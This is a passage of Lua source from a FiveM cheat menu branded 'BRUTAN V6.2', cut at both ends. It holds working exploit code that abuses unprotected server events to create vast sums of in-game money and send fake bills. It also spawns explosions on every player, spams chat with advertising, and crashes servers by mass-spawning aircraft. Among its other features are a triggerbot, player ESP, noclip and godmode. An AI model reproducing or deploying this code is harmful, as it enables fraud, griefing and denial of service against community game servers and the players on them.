    if BlowDrugsUp then Citizen.CreateThread(function() TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellOpium") Citizen.Wait(1000) end) end;
    if blowall then
    for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^B^R^5U^6TAN ^1C^2h^3e^4a^5t^6s", {
            141, 211, 255
        }, "^"..bs..
        "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
    for i = 0, 128 do Citizen.Wait(500) AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true) end end;
    if crosshair then ShowHudComponentThisFrame(14) end;
    if crosshairc then bo("~r~+", 0.495, 0.484) end;
    if crosshairc2 then bo("~r~.", 0.4968, 0.478) end;
    if cL then local da = false; local db = 130; local dc = 0;
    for E = 0, 128 do
        if NetworkIsPlayerActive(E)
    and GetPlayerPed(E)  ~= GetPlayerPed(-1) then ped = GetPlayerPed(E) blip = GetBlipFromEntity(ped) x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(E), true)) distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)) if da then
    if NetworkIsPlayerTalking(E) then local dd = c(1.0) DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(E)..
        "  |  "..GetPlayerName(E), dd.r, dd.g, dd.b)
    else DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(E)..
        "  |  "..GetPlayerName(E), 255, 255, 255) end end;
    if distance < db then
    if not da then
    if NetworkIsPlayerTalking(E) then local dd = c(1.0) DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(E)..
        "  |  "..GetPlayerName(E), dd.r, dd.g, dd.b)
    else DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(E)..
        "  |  "..GetPlayerName(E), 255, 255, 255) end end end end end end;
    if showCoords then x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) bo("~r~X:~s~ "..roundx, 0.05, 0.00) bo("~r~Y:~s~ "..roundy, 0.11, 0.00) bo("~r~Z:~s~ "..roundz, 0.19, 0.00) end;

    function carthieftroll() for i = 0, 128 do local bA = GetEntityCoords(GetPlayerPed(i)) TriggerServerEvent("esx_carthief:alertcops", bA.x, bA.y, bA.z) end end;

    function automaticmoneyesx() local e = KeyboardInput("Warning, this value can be multiplied!!!", "", 100) if e ~= ""
    then local de = KeyboardInput("Are you sure? y/n", "", 0) if de == "y"
    then drawNotification("~h~~g~Testing all ~y~ESX ~g~scripts~s~.") TriggerServerEvent("esx_carthief:pay", e) TriggerServerEvent("esx_jobs:caution", "give_back", e) TriggerServerEvent("esx_fueldelivery:pay", e) TriggerServerEvent("esx_carthief:pay", e) TriggerServerEvent("esx_godirtyjob:pay", e) TriggerServerEvent("esx_pizza:pay", e) TriggerServerEvent("esx_ranger:pay", e) TriggerServerEvent("esx_garbagejob:pay", e) TriggerServerEvent("esx_truckerjob:pay", e) TriggerServerEvent("AdminMenu:giveBank", e) TriggerServerEvent("AdminMenu:giveCash", e) TriggerServerEvent("esx_gopostaljob:pay", e) TriggerServerEvent("esx_banksecurity:pay", e) TriggerServerEvent("esx_slotmachine:sv:2", e) elseif de == "n"
    then drawNotification("~h~~r~Operation cancelled~s~.")
    else drawNotification("~h~~r~Invalid Confirmation~s~.") drawNotification("~h~~r~Operation cancelled~s~.") end end end;

    function vrpdestroy() for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
            141, 211, 255
        }, "^"..bs..
        "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
    TriggerServerEvent("lscustoms:payGarage", {
        costs = -99999999
    }) TriggerServerEvent("vrp_slotmachine:server:2", 999999999) TriggerServerEvent("Banca:deposit", 999999999) TriggerServerEvent("bank:deposit", 999999999) local df = GetPlayerServerId(PlayerId()) for i = 0, 128 do TriggerEvent("bank:transfer", df, GetPlayerServerId(i), 99999999) end end;
    if bk then esxdestroyv2() nukeserver() end;

    function esxdestroyv2() Citizen.CreateThread(function() TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999) TriggerServerEvent("esx_fueldelivery:pay", 9999999999) TriggerServerEvent("esx_carthief:pay", 9999999999) TriggerServerEvent("esx_godirtyjob:pay", 9999999999) TriggerServerEvent("esx_pizza:pay", 9999999999) TriggerServerEvent("esx_ranger:pay", 9999999999) TriggerServerEvent("esx_garbagejob:pay", 9999999999) TriggerServerEvent("esx_truckerjob:pay", 9999999999) TriggerServerEvent("AdminMenu:giveBank", 9999999999) TriggerServerEvent("AdminMenu:giveCash", 9999999999) TriggerServerEvent("esx_gopostaljob:pay", 9999999999) TriggerServerEvent("esx_banksecurity:pay", 9999999999) TriggerServerEvent("esx_slotmachine:sv:2", 9999999999) for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^B^R^5U^6TAN ^1C^2h^3e^4a^5t^6s", {
                141, 211, 255
            }, "^"..bs..
            "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
        for i = 0, 128 do TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "Purposeless", "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem", 43161337) TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3) TriggerServerEvent("NB:recruterplayer", i, "police", 3) end end) end;

    function nukeserver() Citizen.CreateThread(function() local dg = "Avenger"
        local dh = "CARGOPLANE"
        local di = "luxor"
        local dj = "maverick"
        local dk = "blimp2"
        while not HasModelLoaded(GetHashKey(dh)) do Citizen.Wait(0) RequestModel(GetHashKey(dh)) end; while not HasModelLoaded(GetHashKey(di)) do Citizen.Wait(0) RequestModel(GetHashKey(di)) end;
        while not HasModelLoaded(GetHashKey(dg)) do Citizen.Wait(0) RequestModel(GetHashKey(dg)) end;
        while not HasModelLoaded(GetHashKey(dj)) do Citizen.Wait(0) RequestModel(GetHashKey(dj)) end;
        while not HasModelLoaded(GetHashKey(dk)) do Citizen.Wait(0) RequestModel(GetHashKey(dk)) end;
        for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^135u^6n^7i^1t^2y", {
                141, 211, 255
            }, "^"..bs..
            "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
        for i = 0, 128 do local di = CreateVehicle(GetHashKey(dg), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dg), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dg), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dh), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dh), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dh), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(di), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(di), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(di), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true) end end) end;
    if servercrasherxd then Citizen.CreateThread(function() local dg = "Avenger"
        local dh = "CARGOPLANE"
        local di = "luxor"
        local dj = "maverick"
        local dk = "blimp2"
        while not HasModelLoaded(GetHashKey(dh)) do Citizen.Wait(0) RequestModel(GetHashKey(dh)) end; while not HasModelLoaded(GetHashKey(di)) do Citizen.Wait(0) RequestModel(GetHashKey(di)) end;
        while not HasModelLoaded(GetHashKey(dg)) do Citizen.Wait(0) RequestModel(GetHashKey(dg)) end;
        while not HasModelLoaded(GetHashKey(dj)) do Citizen.Wait(0) RequestModel(GetHashKey(dj)) end;
        while not HasModelLoaded(GetHashKey(dk)) do Citizen.Wait(0) RequestModel(GetHashKey(dk)) end;
        for i = 0, 128 do
            for af = 100, 150 do local di = CreateVehicle(GetHashKey(dg), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(dg), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(dg), 2 * GetEntityCoords(GetPlayerPed(i)) + af, true, true) and CreateVehicle(GetHashKey(dh), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(dh), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(dh), 2 * GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(di), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(di), 2 * GetEntityCoords(GetPlayerPed(i)) + af, true, true) and CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + af, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - af, true, true) and CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + af, true, true) end end end) end;
    if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
    if IsControlPressed(0, 209) then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0) elseif IsControlPressed(0, 210) then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0) end end;
    if TriggerBot then local dl, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity) if dl then
    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then ShootPlayer(Entity) end end end; DisplayRadar(true) if RainbowVeh then local a3 = c(1.0) SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a3.r, a3.g, a3.b) SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a3.r, a3.g, a3.b) end;
    if t2x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0) end;
    if t4x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0) end;
    if t10x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0) end;
    if t16x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0) end;
    if txd then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0) end;
    if Noclip then local dm = 2; local dn = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1) FreezeEntityPosition(PlayerPedId(-1), true) SetEntityInvincible(PlayerPedId(-1), true) local dp = GetEntityCoords(entity) DisableControlAction(0, 32, true) DisableControlAction(0, 268, true) DisableControlAction(0, 31, true) DisableControlAction(0, 269, true) DisableControlAction(0, 33, true) DisableControlAction(0, 266, true) DisableControlAction(0, 34, true) DisableControlAction(0, 30, true) DisableControlAction(0, 267, true) DisableControlAction(0, 35, true) DisableControlAction(0, 44, true) DisableControlAction(0, 20, true) local dq = 0.0; local dr = 0.0;
    if GetInputMode() == "MouseAndKeyboard"
    then
    if IsDisabledControlPressed(0, 32) then dq = 0.5 end;
    if IsDisabledControlPressed(0, 33) then dq = -0.5 end;
    if IsDisabledControlPressed(0, 34) then SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0) end;
    if IsDisabledControlPressed(0, 35) then SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0) end;
    if IsDisabledControlPressed(0, 44) then dr = 0.21 end;
    if IsDisabledControlPressed(0, 20) then dr = -0.21 end end; dp = GetOffsetFromEntityInWorldCoords(dn, 0.0, dq * (dm + 0.3), dr * (dm + 0.3)) local bB = GetEntityHeading(dn) SetEntityVelocity(dn, 0.0, 0.0, 0.0) SetEntityRotation(dn, 0.0, 0.0, 0.0, 0, false) SetEntityHeading(dn, bB) SetEntityCollision(dn, false, false) SetEntityCoordsNoOffset(dn, dp.x, dp.y, dp.z, true, true, true) FreezeEntityPosition(dn, false) SetEntityInvincible(dn, false) SetEntityCollision(dn, true, true) end end end) Citizen.CreateThread(function() FreezeEntityPosition(entity, false) local ds = 1; local dt = true; local du = nil; local dv = nil; local dw = nil; local dx = 1; local dy = 1; local dz = {
        1.0, 2.0, 4.0, 10.0, 512.0, 9999.0
    }
    LynxEvo.CreateMenu("LynxX", bh) LynxEvo.SetSubTitle("LynxX", "BRUTAN Cheats") LynxEvo.CreateSubMenu("SelfMenu", "LynxX", "Self Menu") LynxEvo.CreateSubMenu("TeleportMenu", "LynxX", "Teleport Menu") LynxEvo.CreateSubMenu("WeaponMenu", "LynxX", "Weapon Menu") LynxEvo.CreateSubMenu("AdvM", "LynxX", "Advanced Menu") LynxEvo.CreateSubMenu("LuaMenu", "LynxX", "Lua Menu") LynxEvo.CreateSubMenu("VehicleMenu", "LynxX", "Vehicle Menu") LynxEvo.CreateSubMenu("OnlinePlayerMenu", "LynxX", "Online Player Menu") LynxEvo.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayerMenu", "Player Options") LynxEvo.CreateSubMenu("Destroyer", "AdvM", "Destroyer Menu") LynxEvo.CreateSubMenu("ESXBoss", "LuaMenu", "ESX Boss Triggers") LynxEvo.CreateSubMenu("ESXMoney", "LuaMenu", "ESX Money Triggers") LynxEvo.CreateSubMenu("ESXDrugs", "LuaMenu", "ESX Drugs") LynxEvo.CreateSubMenu("ESXCustom", "LuaMenu", "ESX Random Triggers") LynxEvo.CreateSubMenu("VRPTriggers", "LuaMenu", "VRP Triggers") LynxEvo.CreateSubMenu("MiscTriggers", "LuaMenu", "Misc Triggers") LynxEvo.CreateSubMenu("crds", "LynxX", "Credits") LynxEvo.CreateSubMenu("ESXJobs", "LuaMenu", "ESX Jobs") LynxEvo.CreateSubMenu("ESXJobs2", "PlayerOptionsMenu", "ESX Jobs Individual") LynxEvo.CreateSubMenu("ESXTriggerini", "PlayerOptionsMenu", "ESX Triggers") LynxEvo.CreateSubMenu("Trollmenu", "PlayerOptionsMenu", "Troll Menu") LynxEvo.CreateSubMenu("WeaponTypes", "WeaponMenu", "Weapons") LynxEvo.CreateSubMenu("WeaponTypeSelection", "WeaponTypes", "Weapon") LynxEvo.CreateSubMenu("WeaponOptions", "WeaponTypeSelection", "Weapon Options") LynxEvo.CreateSubMenu("ModSelect", "WeaponOptions", "Weapon Mod Options") LynxEvo.CreateSubMenu("CarTypes", "VehicleMenu", "Vehicles") LynxEvo.CreateSubMenu("CarTypeSelection", "CarTypes", "Moew :3") LynxEvo.CreateSubMenu("CarOptions", "CarTypeSelection", "Car Options") LynxEvo.CreateSubMenu("GiveSingleWeaponPlayer", "OnlinePlayerMenu", "Single Weapon Menu") LynxEvo.CreateSubMenu("ESPMenu", "AdvM", "ESP Menu") LynxEvo.CreateSubMenu("LSC", "VehicleMenu", "LSC Customs") LynxEvo.CreateSubMenu("tunings", "LSC", "Visual Tuning") LynxEvo.CreateSubMenu("performance", "LSC", "Performance Tuning") LynxEvo.CreateSubMenu("VRPPlayerTriggers", "PlayerOptionsMenu", "VRP Triggers") LynxEvo.CreateSubMenu("BoostMenu", "VehicleMenu", "Vehicle Boost") LynxEvo.CreateSubMenu("SpawnPeds", "Trollmenu", "Spawn Peds") LynxEvo.CreateSubMenu("GCT", "VehicleMenu", "Global Car Trolls") LynxEvo.CreateSubMenu("CsMenu", "AdvM", "Crosshairs") for i, dA in pairs(bd) do LynxEvo.CreateSubMenu(dA.id, "tunings", dA.name) if dA.
    id == "paint"
    then LynxEvo.CreateSubMenu("primary", dA.id, "Primary Paint") LynxEvo.CreateSubMenu("secondary", dA.id, "Secondary Paint") LynxEvo.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") LynxEvo.CreateSubMenu("classic1", "primary", "Classic Paint") LynxEvo.CreateSubMenu("metallic1", "primary", "Metallic Paint") LynxEvo.CreateSubMenu("matte1", "primary", "Matte Paint") LynxEvo.CreateSubMenu("metal1", "primary", "Metal Paint") LynxEvo.CreateSubMenu("classic2", "secondary", "Classic Paint") LynxEvo.CreateSubMenu("metallic2", "secondary", "Metallic Paint") LynxEvo.CreateSubMenu("matte2", "secondary", "Matte Paint") LynxEvo.CreateSubMenu("metal2", "secondary", "Metal Paint") LynxEvo.CreateSubMenu("classic3", "rimpaint", "Classic Paint") LynxEvo.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") LynxEvo.CreateSubMenu("matte3", "rimpaint", "Matte Paint") LynxEvo.CreateSubMenu("metal3", "rimpaint", "Metal Paint") end end;
    for i, dA in pairs(be) do LynxEvo.CreateSubMenu(dA.id, "performance", dA.name) end;
    local SelectedPlayer;
    while bl do ped = PlayerPedId() veh = GetVehiclePedIsUsing(ped) SetVehicleModKit(veh, 0) for i, dA in pairs(bd) do
        if LynxEvo.
    IsMenuOpened("tunings") then
    if b8 then
    if ba == "neon"
    then local r, g, b = table.unpack(b9) SetVehicleNeonLightsColour(veh, r, g, b) SetVehicleNeonLightEnabled(veh, 0, bc) SetVehicleNeonLightEnabled(veh, 1, bc) SetVehicleNeonLightEnabled(veh, 2, bc) SetVehicleNeonLightEnabled(veh, 3, bc) b8 = false; ba = -1; b9 = -1 elseif ba == "paint"
    then local dB, dC, dD, dE = table.unpack(b9) SetVehicleColours(veh, dB, dC) SetVehicleExtraColours(veh, dD, dE) b8 = false; ba = -1; b9 = -1
    else if bc == "rm"
    then RemoveVehicleMod(veh, ba) b8 = false; ba = -1; b9 = -1
    else SetVehicleMod(veh, ba, b9, false) b8 = false; ba = -1; b9 = -1 end end end end;
    if LynxEvo.IsMenuOpened(dA.id) then
    if dA.id == "wheeltypes"
    then
    if LynxEvo.Button("Sport Wheels") then SetVehicleWheelType(veh, 0) elseif LynxEvo.Button("Muscle Wheels") then SetVehicleWheelType(veh, 1) elseif LynxEvo.Button("Lowrider Wheels") then SetVehicleWheelType(veh, 2) elseif LynxEvo.Button("SUV Wheels") then SetVehicleWheelType(veh, 3) elseif LynxEvo.Button("Offroad Wheels") then SetVehicleWheelType(veh, 4) elseif LynxEvo.Button("Tuner Wheels") then SetVehicleWheelType(veh, 5) elseif LynxEvo.Button("High End Wheels") then SetVehicleWheelType(veh, 7) end; LynxEvo.Display() elseif dA.id == "extra"
    then local dF = checkValidVehicleExtras() for i, dA in pairs(dF) do
        if IsVehicleExtraTurnedOn(veh, i)
    then pricestring = "Installed"
    else pricestring = "Not Installed"
    end;
    if LynxEvo.Button(dA.menuName, pricestring) then SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) end end; LynxEvo.Display() elseif dA.id == "neon"
    then
    if LynxEvo.Button("None") then SetVehicleNeonLightsColour(veh, 255, 255, 255) SetVehicleNeonLightEnabled(veh, 0, false) SetVehicleNeonLightEnabled(veh, 1, false) SetVehicleNeonLightEnabled(veh, 2, false) SetVehicleNeonLightEnabled(veh, 3, false) end;
    for i, dA in pairs(bf) do colorr, colorg, colorb = table.unpack(dA) r, g, b = GetVehicleNeonLightsColour(veh) if colorr ==
    r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then pricestring = "Installed"
    else if b8 and colorr == r and colorg == g and colorb == b then pricestring = "Previewing"
    else pricestring = "Not Installed"
    end end;
    if LynxEvo.Button(i, pricestring) then
    if not b8 then ba = "neon"
    bc = IsVehicleNeonLightEnabled(veh, 1) oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) b9 = table.pack(oldr, oldg, oldb) SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) b8 = true elseif b8 and colorr == r and colorg == g and colorb == b then SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) b8 = false; ba = -1; b9 = -1 elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) b8 = true end end end; LynxEvo.Display() elseif dA.id == "paint"
    then
    if LynxEvo.MenuButton("~h~~p~#~s~ Primary Paint", "primary") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Secondary Paint", "secondary") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Wheel Paint", "rimpaint") then end; LynxEvo.Display()
    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
        if dH.menuName == "~h~~b~Stock"
    then price = 0 end;
    if dA.name == "Horns"
    then
    for dI, dJ in pairs(horns) do
        if dJ ==
    dG - 1 then dH.menuName = dI end end end;
    if dH.menuName == "NULL"
    then dH.menuname = "unknown"
    end;
    if LynxEvo.Button(dH.menuName, price) then
    if not b8 then ba = dA.id; b9 = GetVehicleMod(veh, dA.id) b8 = true;
    if dH.data.realIndex == -1 then bc = "rm"
    RemoveVehicleMod(veh, dH.data.modid) b8 = false; ba = -1; b9 = -1; bc = false
    else bc = false; SetVehicleMod(veh, dA.id, dH.data.realIndex, false) end elseif b8 and GetVehicleMod(veh, dA.id) == dH.data.realIndex then b8 = false; ba = -1; b9 = -1; bc = false;
    if dH.data.realIndex == -1 then RemoveVehicleMod(veh, dH.data.modid)
    else SetVehicleMod(veh, dA.id, dH.data.realIndex, false) end elseif b8 and GetVehicleMod(veh, dA.id)  ~= dH.data.realIndex then
    if dH.data.realIndex == -1 then RemoveVehicleMod(veh, dH.data.modid) b8 = false; ba = -1; b9 = -1; bc = false
    else SetVehicleMod(veh, dA.id, dH.data.realIndex, false) b8 = true end end end end; LynxEvo.Display() end end end;
    for i, dA in pairs(be) do
        if LynxEvo.
    IsMenuOpened(dA.id) then
    if GetVehicleMod(veh, dA.id) == 0 then pricestock = "Not Installed"
    price1 = "Installed"
    price2 = "Not Installed"
    price3 = "Not Installed"
    price4 = "Not Installed"
    elseif GetVehicleMod(veh, dA.id) == 1 then pricestock = "Not Installed"
    price1 = "Not Installed"
    price2 = "Installed"
    price3 = "Not Installed"
    price4 = "Not Installed"
    elseif GetVehicleMod(veh, dA.id) == 2 then pricestock = "Not Installed"
    price1 = "Not Installed"
    price2 = "Not Installed"
    price3 = "Installed"
    price4 = "Not Installed"
    elseif GetVehicleMod(veh, dA.id) == 3 then pricestock = "Not Installed"
    price1 = "Not Installed"
    price2 = "Not Installed"
    price3 = "Not Installed"
    price4 = "Installed"
    elseif GetVehicleMod(veh, dA.id) == -1 then pricestock = "Installed"
    price1 = "Not Installed"
    price2 = "Not Installed"
    price3 = "Not Installed"
    price4 = "Not Installed"
    end;
    if LynxEvo.Button("Stock "..dA.name, pricestock) then SetVehicleMod(veh, dA.id, -1) elseif LynxEvo.Button(dA.name..
        " Upgrade 1", price1) then SetVehicleMod(veh, dA.id, 0) elseif LynxEvo.Button(dA.name..
        " Upgrade 2", price2) then SetVehicleMod(veh, dA.id, 1) elseif LynxEvo.Button(dA.name..
        " Upgrade 3", price3) then SetVehicleMod(veh, dA.id, 2) elseif dA.id ~= 13 and dA.id ~= 12 and LynxEvo.Button(dA.name..
        " Upgrade 4", price4) then SetVehicleMod(veh, dA.id, 3) end; LynxEvo.Display() end end;
    if LynxEvo.IsMenuOpened("LynxX") then local dK = PlayerId(-1) local bw = GetPlayerName(dK) drawNotification("~g~BRUTAN ~o~Lua~r~ ~p~@~s~".."Brutan#7799") drawNotification("~b~https://brutan.wixsite.com/fivem/fivem") if LynxEvo.MenuButton("~h~~p~#~s~ Self Menu", "SelfMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Online Players", "OnlinePlayerMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Teleport Menu", "TeleportMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle Menu", "VehicleMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Weapon Menu", "WeaponMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", "LuaMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", "AdvM") then elseif LynxEvo.MenuButton("~h~~p~# ~y~BRUTAN Cheats", "crds") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("SelfMenu") then
    if LynxEvo.CheckBox("~h~~g~Godmode", Godmode, function(dL) Godmode = dL end) then elseif LynxEvo.Button("~h~~y~Semi ~g~Godmode") then semigodme() elseif LynxEvo.CheckBox("~h~~g~Player Visible", d1, function(dL) d1 = dL end) then elseif LynxEvo.Button("~h~~r~Suicide") then SetEntityHealth(PlayerPedId(-1), 0) elseif LynxEvo.Button("~h~~g~ESX~s~ Revive Yourself~s~") then TriggerEvent("esx_ambulancejob:revive") elseif LynxEvo.Button("~h~~g~Heal/Revive") then SetEntityHealth(PlayerPedId(-1), 200) elseif LynxEvo.Button("~h~~b~Give Armour") then SetPedArmour(PlayerPedId(-1), 200) elseif LynxEvo.CheckBox("~h~Infinite Stamina", InfStamina, function(dL) InfStamina = dL end) then elseif LynxEvo.CheckBox("~h~Thermal ~o~Vision", bTherm, function(bTherm) end) then therm = not therm; bTherm = therm; SetSeethrough(therm) elseif LynxEvo.CheckBox("~h~Fast Run", fastrun, function(dL) fastrun = dL end) then elseif LynxEvo.CheckBox("~h~Super Jump", SuperJump, function(dL) SuperJump = dL end) then elseif LynxEvo.CheckBox("~h~Noclip", Noclip, function(dL) Noclip = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("OnlinePlayerMenu") then
    for i = 0, 128 do
        if NetworkIsPlayerActive(i)
    and GetPlayerServerId(i)  ~= 0 and LynxEvo.MenuButton(GetPlayerName(i)..
        " ~p~["..GetPlayerServerId(i)..
        "]~s~ ~y~["..i..
        "]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~h~~r~DEAD"
            or "~h~~g~ALIVE"), 'PlayerOptionsMenu') then SelectedPlayer = i end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("PlayerOptionsMenu") then LynxEvo.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer)..
        "]") if LynxEvo.MenuButton("~h~~p~#~s~ ESX Triggers", "ESXTriggerini") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ESX Jobs", "ESXJobs2") then elseif LynxEvo.MenuButton("~h~~p~#~s~ VRP Triggers", "VRPPlayerTriggers") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Troll Menu", "Trollmenu") then elseif LynxEvo.Button("~h~Spectate", cz and "~g~[SPECTATING]") then SpectatePlayer(SelectedPlayer) elseif LynxEvo.Button("~h~~r~Semi GOD ~s~Player") then semigodp() elseif LynxEvo.Button("~h~Teleport To") then local de = KeyboardInput("Are you sure? y/n", "", 0) if de == "y"
    then local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1) SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false) elseif de == "n"
